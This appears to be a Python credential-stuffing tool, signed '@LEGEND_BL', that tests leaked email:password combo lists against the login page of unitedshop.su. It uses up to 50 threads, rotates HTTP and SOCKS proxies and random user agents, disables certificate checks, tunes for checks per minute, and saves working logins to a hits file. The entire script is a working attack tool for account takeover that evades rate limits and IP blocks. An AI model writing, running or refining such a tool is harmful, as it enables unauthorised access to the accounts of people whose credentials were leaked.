import os
import random
import requests
import time
import warnings
import threading
import shutil
from queue import Queue
from colorama import init, Fore, Style
from user_agent import generate_user_agent

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'UNITEDSHOP.SU CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")
print(f"{Fore.GREEN}{'[Full Proxy Support: HTTP/HTTPS/SOCKS4/SOCKS5]'.center(columns)}")

combo_file = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip() or "combo.txt"
# Code By - @LEGEND_BL
def load_combos(fn):
    try:
        with open(fn, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ":" in ln and ln.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[-] {fn} not found!")
        return []
# Code By - @LEGEND_BL
def load_proxies():
    try:
        with open("proxy.txt", encoding="utf-8") as f:
            proxies = [ln.strip() for ln in f if ln.strip()]
            if not proxies:
                print(f"{Fore.RED}[-] proxy.txt is empty!")
                return []
            return proxies
    except FileNotFoundError:
        print(f"{Fore.RED}[-] proxy.txt not found!")
        return []
# Code By - @LEGEND_BL
combos = load_combos(combo_file)
proxies = load_proxies()
# Code By - @LEGEND_BL
if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()
if not proxies:
    input(f"\n{Fore.RED}proxy.txt is REQUIRED! Press Enter to exit...")
    exit()
# Code By - @LEGEND_BL
threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))
# Code By - @LEGEND_BL
print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")
print(f"{Fore.BLUE}[*] Starting checker (Target: 10+ CPM)...!\n")
# Code By - @LEGEND_BL
hit_counter = fail_counter = 0
counters_lock = threading.Lock()
print_lock = threading.Lock()
result_counter = 0
start_time = time.time()
# Code By - @LEGEND_BL
def format_proxy(p):
    """
    Universal proxy formatter supporting all proxy types:
    - HTTP proxies: http://host:port or host:port
    - HTTPS proxies: https://host:port
    - SOCKS4 proxies: socks4://host:port
    - SOCKS5 proxies: socks5://host:port or socks5h://host:port
    
    Supported formats:
    - host:port
    - host:port:user:pass
    - user:pass@host:port
    - protocol://host:port
    - protocol://user:pass@host:port
    """
    try:
        p = p.strip()
        if not p:
            return None
        
        # Detect proxy type from prefix
        proxy_type = "http"  # default
        
        # Check for protocol prefix
        if "://" in p:
            proto_part = p.split("://")[0].lower()
            if proto_part in ["socks5", "socks5h"]:
                proxy_type = "socks5h"  # Use socks5h for DNS through proxy
            elif proto_part == "socks4":
                proxy_type = "socks4"
            elif proto_part == "https":
                proxy_type = "http"  # requests uses http for both
            else:
                proxy_type = "http"
            p = p.split("://", 1)[1]
        
        # Format: user:pass@host:port
        if "@" in p:
            auth_part, host_part = p.rsplit("@", 1)
            if ":" in host_part:
                host, port = host_part.rsplit(":", 1)
                if ":" in auth_part:
                    user, passwd = auth_part.split(":", 1)
                    proxy_url = f"{proxy_type}://{user}:{passwd}@{host}:{port}"
                else:
                    proxy_url = f"{proxy_type}://{host}:{port}"
            else:
                return None
        else:
            parts = p.split(":")
            if len(parts) == 2:
                # Format: host:port
                host, port = parts
                proxy_url = f"{proxy_type}://{host}:{port}"
            elif len(parts) == 4:
                # Format: host:port:user:pass
                host, port, user, passwd = parts
                proxy_url = f"{proxy_type}://{user}:{passwd}@{host}:{port}"
            elif len(parts) == 3:
                # Could be host:port:user (incomplete) - try as host:port
                host, port = parts[0], parts[1]
                proxy_url = f"{proxy_type}://{host}:{port}"
            else:
                return None
        
        return {"http": proxy_url, "https": proxy_url}
    except Exception:
        return None
# Code By - @LEGEND_BL
def get_cpm():
    elapsed = time.time() - start_time
    if elapsed > 0:
        return round((result_counter / elapsed) * 60, 1)
    return 0
# Code By - @LEGEND_BL
def worker(q):
    global result_counter, hit_counter, fail_counter
    while True:
        try:
            combo = q.get_nowait()
        except:
            break

        email, pwd = combo.split(":", 1)
        proxy_dict = None
        for _ in range(5):
            proxy_str = random.choice(proxies)
            proxy_dict = format_proxy(proxy_str)
            if proxy_dict: break

        if not proxy_dict:
            with counters_lock: fail_counter += 1
            with counters_lock: num = result_counter + 1; result_counter = num
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | Bad proxy | CPM: {get_cpm()}")
            q.task_done()
            continue

        s = requests.Session()
        userA = generate_user_agent()

        result = "failed"
        reason = "Unknown error"

        for attempt in range(2):
            try:
                login_url = "https://unitedshop.su/login"
                headers = {
                    "User-Agent": userA,
                    "Accept": "application/json, text/javascript, */*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://unitedshop.su",
                    "Referer": "https://unitedshop.su/login"
                }
                payload = {
                    "username": email,
                    "password": pwd
                }

                r = s.post(login_url, data=payload, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
                
                if r.status_code == 200 and ("success" in r.text.lower() or "balance" in r.text.lower() or "dashboard" in r.text.lower()):
                    result = "hit"
                    with counters_lock: hit_counter += 1
                    with open("Unitedshop_Hits.txt", "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
                    break
                elif r.status_code in [401, 403] or "incorrect" in r.text.lower() or "invalid" in r.text.lower():
                    reason = "Invalid credentials"
                    result = "failed"
                    with counters_lock: fail_counter += 1
                    break
                else:
                    reason = "Login failed"
                    result = "failed"
                    with counters_lock: fail_counter += 1
                    break

            except requests.exceptions.RequestException:
                reason = "Timeout / Bad proxy"
                time.sleep(0.5 + attempt * 0.5)
            except Exception as e:
                reason = f"Error: {str(e)[:30]}"
                time.sleep(0.3)

        with counters_lock: num = result_counter + 1; result_counter = num

        if result == "hit":
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Valid Account | CPM: {get_cpm()}")
        else:
            with print_lock:
                print(f"{Fore.WHITE}{num}. {Fore.RED}{email}:{pwd} | {reason} | CPM: {get_cpm()}")

        q.task_done()
        time.sleep(0.1)  # Minimal delay for higher CPM
# Code By - @LEGEND_BL
def main():
    q = Queue()
    for c in combos:
        q.put(c)

    open("Unitedshop_Hits.txt", "w").close()

    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()

    q.join()
# Code By - @LEGEND_BL
    elapsed = time.time() - start_time
    final_cpm = round((result_counter / elapsed) * 60, 1) if elapsed > 0 else 0
    print(f"\n{Fore.CYAN}Finished...!")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter}")
    print(f"{Fore.YELLOW}Final CPM: {final_cpm}")
    print(f"{Fore.CYAN}Hits saved to Unitedshop_Hits.txt")
    input(f"\nPress Enter to exit...")
# Code By - @LEGEND_BL
if __name__ == "__main__":
    main()
